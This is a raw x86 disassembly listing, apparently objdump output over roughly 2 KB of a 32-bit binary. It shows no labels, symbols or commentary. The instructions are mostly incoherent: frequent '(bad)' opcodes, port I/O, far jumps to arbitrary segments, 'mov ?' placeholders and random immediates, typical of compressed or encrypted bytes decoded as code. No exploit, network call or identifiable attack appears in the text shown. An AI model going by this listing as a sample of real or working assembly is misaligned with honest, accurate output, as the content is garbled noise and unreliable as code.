  416f19:	add    DWORD PTR [ebp+0x22d9c404],ebp
  416f1f:	das    
  416f20:	sbb    DWORD PTR [edx+0x285ba0c9],ebx
  416f26:	xor    BYTE PTR [edi-0x42eb2f08],bh
  416f2c:	repz jle 0x416faa
  416f2f:	jecxz  0x416ee8
  416f31:	xchg   edx,eax
  416f32:	mov    ds:0x5a6712e6,al
  416f37:	idiv   BYTE PTR [eax-0x23]
  416f3a:	(bad)  
  416f3b:	rcr    ah,1
  416f3d:	fistp  DWORD PTR [ecx]
  416f3f:	cmp    dl,BYTE PTR [edx]
  416f41:	fisubr DWORD PTR [esi]
  416f43:	repnz dec eax
  416f45:	(bad)  [eax-0x2128a9cc]
  416f4b:	add    dl,0x23
  416f4e:	imul   eax,ecx
  416f51:	add    esp,eax
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	xchg   DWORD PTR [ecx],esp
  416f6c:	call   0xb970:0x7f193717
  416f73:	jle    0x416fe5
  416f75:	jo     0x416f95
  416f77:	mov    dl,0xee
  416f79:	test   eax,0x6148eac7
  416f7e:	jbe    0x416f1c
  416f80:	push   ecx
  416f81:	pop    edi
  416f82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f83:	jae    0x416f87
  416f85:	pop    edx
  416f86:	push   es
  416f87:	ins    DWORD PTR es:[edi],dx
  416f88:	popf   
  416f89:	sahf   
  416f8a:	dec    ecx
  416f8b:	push   eax
  416f8c:	xchg   ebp,eax
  416f8d:	pushf  
  416f8e:	xchg   ecx,eax
  416f8f:	in     eax,dx
  416f90:	and    DWORD PTR [edx+0x706b9b40],esp
  416f96:	jg     0x416ff3
  416f98:	xchg   DWORD PTR [edx-0x4226c812],edi
  416f9e:	push   0x5aa328bb
  416fa3:	mov    dl,0xcb
  416fa5:	imul   ebx,eax,0x13
  416fa8:	jg     0x416f99
  416faa:	xchg   BYTE PTR [ebx],cl
  416fac:	bts    DWORD PTR [edi-0x5a8adb5],ecx
  416fb3:	adc    al,0x89
  416fb5:	jns    0x416fdc
  416fb7:	push   esi
  416fb8:	jge    0x416f6b
  416fba:	or     edx,DWORD PTR [eax+0x19f2eba]
  416fc0:	jl     0x416ffa
  416fc2:	jge    0x416f81
  416fc4:	std    
  416fc5:	cdq    
  416fc6:	mov    ds:0x497d2347,al
  416fcb:	add    eax,DWORD PTR [ebx-0x23362953]
  416fd1:	stos   DWORD PTR es:[edi],eax
  416fd2:	aad    0xf7
  416fd4:	xor    al,0xa3
  416fd6:	and    DWORD PTR [edx+0x54],ebp
  416fd9:	pop    ebp
  416fda:	les    ebp,FWORD PTR [esi+eax*2-0xe]
  416fde:	jmp    0x416fae
  416fe0:	add    DWORD PTR [ebx],0xa3c473cc
  416fe6:	aad    0x8e
  416fe8:	pop    es
  416fe9:	stos   BYTE PTR es:[edi],al
  416fea:	push   0x42
  416fec:	xor    eax,0xe71c1e17
  416ff1:	dec    esi
  416ff2:	pop    es
  416ff3:	mov    ds:0xf6e6c11c,al
  416ff8:	lods   eax,DWORD PTR ds:[esi]
  416ff9:	mov    ?,ebx
  416ffb:	cmp    bh,dl
  416ffd:	mov    ah,0x14
  416fff:	cmp    eax,0x424c9521
  417004:	mov    ah,0x57
  417006:	inc    edx
  417007:	lods   al,BYTE PTR ds:[esi]
  417008:	inc    edi
  417009:	shl    DWORD PTR [ecx+0xe],cl
  41700c:	test   eax,0x9e32453f
  417011:	sub    DWORD PTR [ecx-0x7f],edi
  417014:	call   0xd652575e
  417019:	xchg   ecx,eax
  41701a:	pushf  
  41701b:	imul   edx,DWORD PTR [edi+0x1678ecf8],0x42
  417022:	mov    esp,0xa634cbe3
  417027:	mov    ds:0x3fb96912,al
  41702c:	push   ebx
  41702d:	ins    BYTE PTR es:[edi],dx
  41702e:	mov    dh,0xe6
  417030:	lahf   
  417031:	pop    ss
  417032:	xor    eax,0xbd75f516
  417037:	dec    edx
  417038:	mov    ebp,0x343d5ffd
  41703d:	loop   0x417018
  41703f:	mov    dl,BYTE PTR [eax-0x7a]
  417042:	adc    ch,BYTE PTR [ebx+0x17]
  417045:	les    ecx,FWORD PTR [edx-0x35c1cb37]
  41704b:	dec    ebx
  41704c:	test   DWORD PTR [edi],edi
  41704e:	test   DWORD PTR [edi+0x1f],esp
  417051:	aam    0x6
  417053:	add    esi,DWORD PTR [edi]
  417055:	xor    eax,0xc38ff998
  41705a:	jne    0x417049
  41705c:	sub    BYTE PTR [esi-0x1647b7f7],0xd6
  417063:	pop    esi
  417064:	sub    edx,eax
  417066:	(bad)  
  417067:	push   es
  417068:	ins    BYTE PTR es:[edi],dx
  417069:	jp     0x4170d4
  41706b:	js     0x417007
  41706d:	rcr    edi,cl
  41706f:	fsub   st,st(0)
  417071:	popa   
  417072:	add    al,ch
  417074:	loop   0x4170f2
  417076:	fdiv   DWORD PTR [edx-0x37a5dd4d]
  41707c:	outs   dx,DWORD PTR ds:[esi]
  41707d:	pop    ss
  41707e:	int    0xf3
  417080:	mov    bh,0xb3
  417082:	lods   eax,DWORD PTR ds:[esi]
  417083:	push   ds
  417084:	test   BYTE PTR [eax+0x32],bl
  417087:	mov    esp,0xae49340d
  41708c:	mov    bh,0xa6
  41708e:	push   0x14c61035
  417093:	pop    esp
  417094:	push   ebp
  417095:	(bad)  
  417096:	idiv   BYTE PTR [eax-0x665db811]
  41709c:	fmul   QWORD PTR [edx-0x52]
  41709f:	pop    ds
  4170a0:	pop    ebp
  4170a1:	push   ss
  4170a2:	cmp    dh,0xd7
  4170a5:	repnz xlat BYTE PTR ds:[ebx]
  4170a7:	add    ebx,DWORD PTR [edx]
  4170a9:	repz loopne 0x417048
  4170ac:	pop    edi
  4170ad:	div    DWORD PTR [edx+0x786cc9f4]
  4170b3:	add    esi,DWORD PTR [edi]
  4170b5:	xor    al,0x9f
  4170b7:	push   esp
  4170b8:	cmp    eax,0x9044db0c
  4170bd:	jp     0x41712d
  4170bf:	pop    edi
  4170c0:	in     al,0x2b
  4170c2:	jo     0x417048
  4170c4:	cwde   
  4170c5:	(bad)  
  4170c6:	loope  0x4170b6
  4170c8:	adc    BYTE PTR [ebp-0x6afd73b2],0x16
  4170cf:	jmp    0xecf6:0xca0e3c5d
  4170d6:	sbb    DWORD PTR [edi-0x388d1d27],eax
  4170dc:	call   0xc02d1e0d
  4170e1:	pushf  
  4170e2:	pop    ecx
  4170e3:	jmp    0x4efc:0xbb1f9bda
  4170ea:	mov    ds:0x61fda52f,al
  4170ef:	and    BYTE PTR [ebx-0x4e753718],ch
  4170f5:	mov    cs,WORD PTR [esp+esi*8+0x6f8112eb]
  4170fc:	popf   
  4170fd:	icebp  
  4170fe:	ins    DWORD PTR es:[edi],dx
  4170ff:	jae    0x417133
  417101:	ds pusha 
  417103:	out    dx,al
  417104:	add    DWORD PTR [ecx-0x4b],edi
  417107:	sub    al,0xf1
  417109:	xchg   edi,eax
  41710a:	mov    dl,0x3a
  41710c:	mov    fs,WORD PTR [eax-0x5a]
  41710f:	in     al,0xc6
  417111:	mov    eax,ds:0x3a4acb39
  417116:	xlat   BYTE PTR ds:[ebx]
  417117:	(bad)  
  417118:	hlt    
  417119:	enter  0x6c31,0x8f
  41711d:	push   cs
  41711e:	(bad)  
  41711f:	lahf   
  417120:	adc    al,0x35
  417122:	push   es
  417123:	and    DWORD PTR ds:0x6344881,edx
  417129:	add    BYTE PTR [edx],cl
  41712b:	sub    BYTE PTR [ebx],ch
  41712d:	aam    0x82
  41712f:	push   esp
  417130:	mov    ebp,0x1f471739
  417135:	or     al,BYTE PTR [esi-0x6d7deaaf]
  41713b:	js     0x41717f
  41713d:	push   ecx
  41713e:	adc    BYTE PTR [edi],ch
  417140:	lods   eax,DWORD PTR ds:[esi]
  417141:	pop    ss
  417142:	(bad)  
  417143:	mov    cl,0x5
  417145:	lds    edi,FWORD PTR [ebp-0x7e]
  417148:	in     eax,dx
  417149:	cmp    ch,bl
  41714b:	sub    ch,BYTE PTR [edi+0x3a4f0a43]
  417151:	adc    eax,eax
  417153:	add    eax,0x6e6435da
  417158:	test   BYTE PTR ds:0xf56f7705,bl
  41715e:	sbb    BYTE PTR [ecx+esi*1],cl
  417161:	pop    ds
  417162:	js     0x417187
  417164:	pop    edi
  417165:	mov    bh,BYTE PTR [ecx+0x1b]
  417168:	scas   al,BYTE PTR es:[edi]
  417169:	adc    bx,WORD PTR [ebx+0x15c3b676]
  417170:	add    ebx,DWORD PTR [ebx*8-0x6ec8711e]
  417177:	or     al,0x15
  417179:	mov    ?,WORD PTR [ecx+eiz*8-0x2]
  41717d:	mov    al,ds:0xd766b861
  417182:	lods   eax,DWORD PTR ds:[esi]
  417183:	jmp    0x4171ac
  417185:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417186:	push   cs
  417187:	inc    esi
  417188:	adc    al,0x6c
  41718a:	and    al,0x93
  41718c:	hlt    
  41718d:	dec    edx
  41718e:	pop    ebp
  41718f:	cmc    
  417190:	cmp    al,0x70
  417192:	dec    esi
  417193:	out    dx,eax
  417194:	call   DWORD PTR [edx-0xe471923]
  41719a:	and    bh,BYTE PTR [edi-0x40]
  41719d:	mul    DWORD PTR [ebx-0x137e5653]
  4171a3:	cld    
  4171a4:	xor    eax,0xe00392c8
  4171a9:	push   esi
  4171aa:	data16 fidivr WORD PTR [edi]
  4171ad:	or     eax,0xdc95a321
  4171b2:	ja     0x41716c
  4171b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171b5:	adc    eax,0x704a6712
  4171ba:	pop    ecx
  4171bb:	faddp  st(0),st
  4171bd:	jmp    0x417156
  4171bf:	or     ah,0x9f
  4171c2:	jnp    0x417206
  4171c4:	test   DWORD PTR [edi],eax
  4171c6:	loopne 0x417222
  4171c8:	loopne 0x4171a2
  4171ca:	xchg   ecx,eax
  4171cb:	clc    
  4171cc:	lods   al,BYTE PTR ds:[esi]
  4171cd:	jecxz  0x41723d
  4171cf:	push   edx
  4171d0:	inc    edi
  4171d1:	mov    ch,0x44
  4171d3:	cmp    BYTE PTR [edi],ah
  4171d5:	xchg   ebp,eax
  4171d6:	dec    esi
  4171d7:	fild   QWORD PTR [esi+esi*2+0x5e425f81]
  4171de:	repnz sub eax,0xbddc90fa
  4171e4:	in     al,dx
  4171e5:	cmc    
  4171e6:	mov    WORD PTR [edi-0x5c26c276],?
  4171ec:	jmp    FWORD PTR [ecx-0x55]
  4171ef:	sbb    al,0x5b
  4171f1:	sbb    esp,ebx
  4171f3:	retf   
  4171f4:	icebp  
  4171f5:	lods   al,BYTE PTR ds:[esi]
  4171f6:	les    eax,FWORD PTR [ecx+0x62]
  4171f9:	xchg   esi,eax
  4171fa:	sub    dl,dh
  4171fc:	rol    BYTE PTR [ebp+ecx*4+0x5f],0x8a
  417201:	dec    eax
  417202:	sbb    BYTE PTR [edx+0x18a2684d],bh
  417208:	mov    ?,WORD PTR [ebx]
  41720a:	outs   dx,BYTE PTR ds:[esi]
  41720b:	sub    esi,DWORD PTR [ebx-0x60]
  41720e:	scas   eax,DWORD PTR es:[edi]
  41720f:	mov    ds,WORD PTR [esi+0x9e8e71c]
  417215:	in     al,dx
  417216:	daa    
  417217:	(bad)  
  417218:	outs   dx,BYTE PTR ds:[esi]
  417219:	(bad)  
  41721a:	sub    eax,0xeb307e72
  41721f:	mov    BYTE PTR [edi],dl
  417221:	loop   0x417295
  417223:	adc    ebx,edi
  417225:	out    dx,al
  417226:	lea    eax,[esi+esi*8+0x2c57ee97]
  41722d:	ficom  DWORD PTR [esi-0x32]
  417230:	push   0x26
  417232:	sub    esp,DWORD PTR [edx]
  417234:	add    al,0xf2
  417236:	push   edi
  417237:	(bad)  
  417238:	mov    bl,0x3
  41723a:	or     DWORD PTR [ebx+0x3434a7b],ebx
  417240:	sbb    al,0x1a
  417242:	dec    ebx
  417243:	jmp    0x417527
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	push   0x0
  417256:	add    esi,DWORD PTR [ecx+0x707f2670]
  41725c:	mov    ecx,0x3470707e
  417261:	inc    eax
  417262:	loope  0x4172ab
  417264:	or     al,0xed
  417266:	mov    eax,eax
  417268:	retf   0x468d
  41726b:	mov    ebp,0xa4fabe31
  417270:	pop    edi
  417271:	jns    0x417251
  417273:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417274:	nop
  417275:	js     0x417290
  417277:	pop    esi
  417278:	stos   BYTE PTR es:[edi],al
  417279:	cmp    eax,0x84ec9806
  41727e:	push   ecx
  41727f:	les    ebx,FWORD PTR [ebx]
  417281:	into   
  417282:	push   ebx
  417283:	or     eax,0x7c8de9c9
  417288:	xchg   edi,eax
  417289:	hlt    
  41728a:	sub    BYTE PTR [eax+0x1c3181ed],cl
  417290:	xchg   ebx,eax
  417291:	and    ecx,DWORD PTR [eax+edx*1+0xf20e00e]
  417298:	icebp  
  417299:	gs or  al,0xde
  41729c:	mov    eax,ds:0x2c0ac2b1
  4172a1:	inc    ebx
  4172a2:	repnz test dl,ah
  4172a5:	gs dec eax
  4172a7:	sti    
  4172a8:	jge    0x4172ef
  4172aa:	pop    eax
  4172ab:	call   0xbe0b:0x147e7908
  4172b2:	mov    DWORD PTR [ebp+ebp*8-0x3b],esp
  4172b6:	shr    BYTE PTR [esi-0x7f3e1c32],0x1e
  4172bd:	hlt    
  4172be:	jmp    FWORD PTR [ebp-0x6d331a0c]
  4172c4:	in     al,dx
  4172c5:	push   0x6abd30b1
  4172ca:	mov    bl,0xc
  4172cc:	push   es
  4172cd:	mov    ebp,0x718b81e9
  4172d2:	jo     0x417286
  4172d4:	jae    0x4172ec
  4172d6:	dec    ebx
  4172d7:	dec    eax
  4172d8:	(bad)  
  4172d9:	iret   
  4172da:	loope  0x4172b5
  4172dc:	push   ds
  4172dd:	into   
  4172de:	sbb    BYTE PTR [edx+0xe],dl
  4172e1:	adc    DWORD PTR [ebp-0x27],edx
  4172e4:	add    ecx,ebp
  4172e6:	mov    ebx,0x9cf5f12d
  4172eb:	arpl   WORD PTR [eax+0xe161ea],sp
  4172f1:	xchg   edi,eax
  4172f2:	rcl    BYTE PTR [ecx],0x7d
  4172f5:	sbb    edx,DWORD PTR [edx]
  4172f7:	jg     0x417337
  4172f9:	push   esp
  4172fa:	xchg   esp,eax
  4172fb:	cmp    eax,0x3096cdbd
  417300:	push   ebp
  417301:	mov    al,0x8f
  417303:	jbe    0x4172a7
  417305:	and    dl,BYTE PTR [edi-0x2e]
  417308:	aaa    
  417309:	pop    edi
  41730a:	test   DWORD PTR [eax+0x5d],eax
  41730d:	or     eax,0x97e5f089
  417312:	and    al,0xd4
  417314:	inc    eax
  417315:	mov    ch,0xc
  417317:	lock jl 0x417347
  41731a:	adc    DWORD PTR [esi-0x50],ebp
  41731d:	and    eax,0x814ce7d
  417322:	stos   BYTE PTR es:[edi],al
  417323:	into   
  417324:	daa    
  417325:	sub    BYTE PTR [ecx],dh
  417327:	lods   al,BYTE PTR ds:[esi]
  417328:	mov    al,0x48
  41732a:	jbe    0x417333
  41732c:	fs (bad) 
  41732e:	cmc    
  41732f:	fcom   st(1)
  417331:	dec    esi
  417332:	jns    0x4172e2
  417334:	retf   
  417335:	ficomp DWORD PTR [ebp-0x1e]
  417338:	xor    ecx,DWORD PTR [ebx]
  41733a:	ror    BYTE PTR [edi-0x40a8757b],1
  417340:	inc    edi
  417341:	in     eax,0x4c
  417343:	scas   al,BYTE PTR es:[edi]
  417344:	in     al,dx
  417345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417346:	add    bh,BYTE PTR [edx]
  417348:	(bad)  
  417349:	es inc ebp
  41734b:	push   edi
  41734c:	cdq    
  41734d:	jmp    0x8ca3c322
  417352:	mov    ebp,0x913bfe70
  417357:	push   eax
  417358:	pop    edx
  417359:	loopne 0x4173a6
  41735b:	cld    
  41735c:	mov    edx,0x3fa71474
  417361:	icebp  
  417362:	fwait
  417363:	dec    ebx
  417364:	sbb    BYTE PTR ds:0x8fd0f24c,0x77
  41736b:	pop    edx
  41736c:	mov    ds:0x192ff963,eax
  417371:	push   ecx
  417372:	test   BYTE PTR [edx-0x11],0xbd
  417376:	and    DWORD PTR ds:0x8b951fbc,edx
  41737c:	cli    
  41737d:	push   0xf1146346
  417382:	pushf  
  417383:	adc    al,0x13
  417385:	jmp    0x5a9c06cf
  41738a:	sar    ecx,1
  41738c:	and    edi,DWORD PTR [eax-0x32a488cf]
  417392:	in     eax,dx
  417393:	inc    ebp
  417394:	and    eax,0xbcce6906
  417399:	iret   
  41739a:	mov    cl,BYTE PTR ds:0x38b3f431
  4173a0:	add    DWORD PTR [esp+ecx*4-0x61],ecx
  4173a4:	mov    esp,0x2de58715
  4173a9:	inc    esp
  4173aa:	ja     0x41741b
  4173ac:	jb     0x417407
  4173ae:	xor    BYTE PTR [edx-0x1f],dl
  4173b1:	call   0xd703:0x93eb56fd
  4173b8:	mov    ss,WORD PTR [edi]
  4173ba:	lock ds inc esp
  4173bd:	fstp   QWORD PTR [eax+0x4e]
  4173c0:	rcl    DWORD PTR ds:0x3230fc99,0x1a
  4173c7:	xor    eax,0xeb392f61
  4173cc:	ss dec edi
  4173ce:	(bad)  
  4173d0:	sbb    BYTE PTR [esi],0x10
  4173d3:	mov    ebx,0x595b4f81
  4173d8:	mov    sp,0x181
  4173dc:	leave  
  4173dd:	ds stos BYTE PTR es:[edi],al
  4173df:	sub    eax,0x1cf8cb96
  4173e4:	jp     0x41739c
  4173e6:	sub    ebx,edi
  4173e8:	pop    edx
  4173e9:	ret    
  4173ea:	inc    edx
  4173eb:	(bad)  
  4173ec:	mov    ss,WORD PTR [ecx]
  4173ee:	pop    edx
  4173ef:	cmp    ecx,DWORD PTR [edi+eax*8-0x5d]
  4173f3:	jge    0x417446
  4173f5:	sub    al,0x18
  4173f7:	add    dh,dl
  4173f9:	push   ebp
  4173fa:	push   cs
  4173fb:	cmp    BYTE PTR [edx],dh
  4173fd:	dec    ebp
  4173fe:	pop    ss
  4173ff:	mov    BYTE PTR [ecx-0x5b8358b7],bh
  417405:	mov    dl,BYTE PTR [ebx+0x55]
  417408:	je     0x4173fd
  41740a:	cmp    DWORD PTR [edx+0x1c6cd76c],0x38
  417411:	mov    dl,0xc7
  417413:	add    al,0xe9
  417415:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417416:	mov    cs,WORD PTR [eax]
  417418:	scas   al,BYTE PTR es:[edi]
  417419:	outs   dx,DWORD PTR ds:[esi]
  41741a:	pop    esp
  41741b:	sub    DWORD PTR [edi-0x42d42f36],ebx
  417421:	das    
  417422:	xchg   ebx,eax
  417423:	pop    esi
  417424:	mov    ds:0x97180376,eax
  417429:	mov    al,ds:0xab9fe44e
  41742e:	imul   DWORD PTR [eax+esi*1-0x2d0d8856]
  417435:	lods   al,BYTE PTR ds:[esi]
  417436:	inc    eax
  417437:	push   ecx
  417438:	repz add eax,DWORD PTR [ecx+eax*4-0x37bdda23]
  417440:	repnz (bad)
  417443:	jae    0x41740f
  417445:	sbb    DWORD PTR [ebx],0xffffffcd
  417448:	mov    dl,0xa1
  41744a:	(bad)  
  41744b:	jne    0x41749c
  41744d:	fiadd  WORD PTR [edx+0x2c]
  417450:	shr    BYTE PTR [ebx],cl
  417452:	mov    al,ds:0xbb1cee4f
  417457:	nop
  417458:	bound  esp,QWORD PTR [esi+0x58]
  41745b:	adc    eax,0x1a2aac48
  417460:	ficom  DWORD PTR ds:0x2962972
  417466:	add    BYTE PTR [ebx+0x7b6c335e],al
  41746c:	and    DWORD PTR [ebx],edx
  41746e:	xchg   DWORD PTR [edx+0x5798ad09],ecx
  417474:	jmp    0xc4dd05fa
  417479:	mov    eax,0xed1d148
  41747e:	add    eax,0x43108038
  417483:	fwait
  417484:	in     eax,0xbc
  417486:	out    0x39,al
  417488:	pop    ecx
  417489:	into   
  41748a:	fs jmp 0x4186:0x63a6445
  417492:	shl    BYTE PTR [ecx],1
  417494:	jb     0x41743c
  417496:	push   ebx
  417497:	cmc    
  417498:	js     0x4174fc
  41749a:	fdivr  DWORD PTR [eax]
  41749c:	mov    eax,ds:0xa18add29
  4174a1:	popf   
  4174a2:	test   al,0x16
  4174a4:	mov    ch,0x0
  4174a6:	or     ch,BYTE PTR [edi]
  4174a8:	ficom  DWORD PTR [edx]
  4174aa:	ror    DWORD PTR [edx+0x33],0x2f
  4174ae:	(bad)  
  4174af:	jmp    FWORD PTR [edi-0x4bfdb097]
  4174b5:	pushw  0x7503
  4174b9:	jbe    0x417497
  4174bb:	rcl    bl,0x6f
  4174be:	dec    eax
  4174bf:	dec    ecx
  4174c0:	sub    ah,ah
  4174c2:	loopne 0x4174da
  4174c4:	lea    eax,[ebx-0x3a]
  4174c7:	dec    ebp
  4174c8:	xchg   ecx,eax
  4174c9:	jmp    0x122f:0xf4c595c8
  4174d0:	rcr    bh,cl
  4174d2:	mov    al,0x65
  4174d4:	adc    eax,DWORD PTR [ebx+0x74]
  4174d7:	cld    
  4174d8:	sbb    eax,0x3f28ada0
  4174dd:	(bad)  
  4174de:	icebp  
  4174df:	dec    eax
  4174e0:	push   ss
  4174e1:	out    dx,al
  4174e2:	add    DWORD PTR [edi+0x7301ded0],0x75
  4174e9:	nop
  4174ea:	call   0x38d7:0xf1243eb3
  4174f1:	pop    eax
  4174f2:	ret    
  4174f3:	mov    cl,0xc5
  4174f5:	inc    edi
  4174f6:	pusha  
  4174f7:	push   ds
  4174f8:	loop   0x4174df
  4174fa:	push   es
  4174fb:	shl    BYTE PTR [edi-0x30],0x2
  4174ff:	xchg   ebp,eax
  417500:	popf   
  417501:	xor    edi,eax
  417503:	fucomi st,st(7)
  417505:	inc    ebp
  417506:	sti    
  417507:	and    BYTE PTR [ecx],bh
  417509:	push   ds
  41750a:	xor    DWORD PTR [ebp+edi*2-0x40c6991d],0xc22bed3b
  417515:	in     al,0x8
  417517:	and    DWORD PTR [ebp-0x34c9fc66],0x64
  41751e:	(bad)  
  417520:	jp     0x417524
  417522:	sub    al,0xb7
  417524:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417525:	jnp    0x41759e
  417527:	xor    edx,edx
  417529:	add    DWORD PTR [ebp-0xc],ebx
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    DWORD PTR [edx+0x14],esi
  417544:	or     bl,cl
  417546:	mov    ecx,0xb9707f24
  41754b:	jle    0x4175bd
  41754d:	jo     0x4174de
  41754f:	inc    esi
  417551:	in     eax,dx
  417552:	shr    bh,1
  417554:	cld    
  417555:	in     eax,0xca
  417557:	leave  
  417558:	mov    WORD PTR [ecx],fs
  41755a:	sub    eax,ecx
  41755c:	popf   
  41755d:	and    DWORD PTR [edi],ebp
  41755f:	adc    ch,BYTE PTR [esi-0x1e]
  417562:	or     BYTE PTR [edx-0x7356cba1],al
  417568:	retf   0x2430
  41756b:	mov    ebx,0x9e2ac6d4
  417570:	ja     0x41758d
  417572:	jnp    0x41751e
  417574:	addr16 pop edx
  417576:	pop    ebx
  417577:	in     al,0x32
  417579:	xchg   edx,eax
  41757a:	sub    eax,0x42160550
  41757f:	or     al,0x4e
  417581:	dec    edi
  417582:	popa   
  417583:	jp     0x41758c
  417585:	cs adc DWORD PTR fs:0x12b1ca5a,ebx
  41758d:	sub    BYTE PTR [ecx+edi*1-0x5a],al
  417591:	push   edx
  417592:	pop    edx
  417593:	and    dh,BYTE PTR [esi-0x31e28d6b]
  417599:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41759a:	push   ds
  41759b:	mov    al,ch
  41759d:	inc    esp
  41759e:	mov    ds:0xe423d17e,eax
  4175a3:	(bad)  [ecx-0x52341bf]
  4175a9:	fcomp  QWORD PTR [esi]
  4175ab:	xor    bl,BYTE PTR [edx]
  4175ad:	dec    esi
  4175ae:	pop    DWORD PTR [eax+0x1077cb85]
  4175b4:	retf   0x859f
  4175b7:	stos   DWORD PTR es:[edi],eax
  4175b8:	mov    ebx,0x59510ba5
  4175bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175be:	add    al,0xe8
  4175c0:	add    DWORD PTR [ebx+0xb630292],0xf9526137
  4175ca:	ret    
  4175cb:	cmp    al,0xcb
  4175cd:	or     ch,0x36
  4175d0:	mov    bh,0x6e
  4175d2:	test   BYTE PTR [ebp-0x21b646aa],al
  4175d8:	(bad)  
  4175d9:	lock push ecx
  4175db:	test   al,0x3d
  4175dd:	jae    0x417618
  4175df:	aaa    
  4175e0:	push   ds
  4175e1:	mov    ds:0xbed77c00,eax
  4175e6:	(bad)  
  4175e7:	cdq    
  4175e8:	pop    esi
  4175e9:	out    0xc6,al
  4175eb:	pop    edi
  4175ec:	out    0x52,eax
  4175ee:	mov    dl,0x25
  4175f0:	dec    esp
  4175f1:	out    dx,eax
  4175f2:	out    dx,al
  4175f3:	or     bl,al
  4175f5:	outs   dx,BYTE PTR ds:[esi]
  4175f6:	mov    ebp,0xe5daac38
  4175fb:	or     al,0x73
  4175fd:	scas   eax,DWORD PTR es:[edi]
  4175fe:	pop    esi
  4175ff:	test   BYTE PTR [eax-0x24],cl
  417602:	jo     0x417681
  417604:	mov    ah,0x51
  417606:	call   0xa24664e1
  41760b:	push   edx
  41760c:	pop    ecx
  41760d:	repz pop edi
  41760f:	mov    BYTE PTR ds:0x46495f65,0xf9
  417616:	mov    ah,0x64
  417618:	sub    al,0xfd
  41761a:	pop    edi
  41761b:	pushf  
  41761c:	mov    WORD PTR [esp],gs
  41761f:	add    DWORD PTR [edi+ebx*8+0x53d94aa9],esp
  417626:	ins    DWORD PTR es:[edi],dx
  417627:	sbb    DWORD PTR [esi-0x2288f5fe],edx
  41762d:	xor    BYTE PTR [esi+edi*4+0x67],0x9
  417632:	xchg   BYTE PTR [eax*1+0x5e849585],ch
  417639:	out    0x4f,eax
  41763b:	shl    BYTE PTR [edx+ecx*2-0x6b],1
  41763f:	jl     0x4175dd
  417641:	sbb    DWORD PTR [ebx],esi
  417643:	iret   
  417644:	clc    
  417645:	mov    bl,0xc5
  417647:	fwait
  417648:	sbb    eax,0xbe619eac
  41764d:	in     al,0x17
  41764f:	xchg   ebp,eax
  417650:	popf   
  417651:	push   ds
  417652:	loope  0x4175f8
  417654:	mov    al,0x18
  417656:	push   cs
  417657:	out    dx,eax
  417658:	aam    0x3b
  41765a:	sub    esp,DWORD PTR [ebx]
  41765c:	test   ecx,esi
  41765e:	mov    eax,0x1feecf8e
  417663:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417665:	lock pop es
  417667:	inc    esp
  417668:	jmp    0x19d6:0xab5d3a19
  41766f:	sub    DWORD PTR [ecx+eax*1-0x78b20797],ebx
  417676:	sbb    esp,DWORD PTR [ebx]
  417678:	and    edx,DWORD PTR [esi+0x5c]
  41767b:	pop    edx
  41767c:	adc    cl,BYTE PTR [ecx-0x51]
  41767f:	and    dl,bh
  417681:	out    dx,eax
  417682:	enter  0xa00a,0xee
  417686:	sub    DWORD PTR [ecx+0x619038da],0x38cee34c
  417690:	xchg   edx,eax
  417691:	dec    eax
  417692:	push   cs
  417693:	fisub  WORD PTR ds:0xdc2dbd9c
  417699:	std    
  41769a:	fisttp QWORD PTR [ebx]
  41769c:	fadd   DWORD PTR [eax+edx*1+0x1195f6e9]
  4176a3:	or     ah,BYTE PTR [ebp-0xe2f0a09]
  4176a9:	pusha  
  4176aa:	jae    0x41762e
  4176ac:	and    edi,edx
  4176ae:	jge    0x4176c5
  4176b0:	sahf   
  4176b1:	push   ss
  4176b2:	mov    edi,0x50bb8b69
  4176b7:	hlt    
  4176b8:	push   es
  4176b9:	jecxz  0x4176ab
  4176bb:	jmp    0x417717
  4176bd:	jmp    edi
  4176bf:	push   es
  4176c0:	xchg   di,bp
  4176c3:	sub    al,ah
  4176c5:	(bad)  
  4176c6:	sbb    eax,0xa61d0c80
  4176cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176cc:	ret    
  4176cd:	test   BYTE PTR [ecx+0x4a],bh
  4176d0:	icebp  
  4176d1:	fisub  DWORD PTR [edi]
  4176d3:	inc    ecx
  4176d4:	cs out 0x7f,al
  4176d7:	and    bh,bl
  4176d9:	sar    BYTE PTR [edx-0xa],0x80
  4176dd:	dec    ebp
  4176de:	aam    0x65
  4176e0:	loope  0x417684
  4176e2:	fwait
  4176e3:	sbb    BYTE PTR [esi+0x7e],bh
  4176e6:	cmp    esp,DWORD PTR [edx]
  4176e8:	call   0xf593052f
  4176ed:	xchg   BYTE PTR [eax-0x78fb751d],dh
  4176f3:	mov    esp,0x78ac8143
  4176f9:	xor    DWORD PTR [edi-0x1b6350fc],edx
  4176ff:	stc    
  417700:	mov    WORD PTR [esi],gs
  417702:	arpl   WORD PTR [ebx-0x54],bx
  417705:	mov    eax,0x13989bef
  41770a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41770b:	fisttp WORD PTR [esi+0x8]
  41770e:	jbe    0x417783
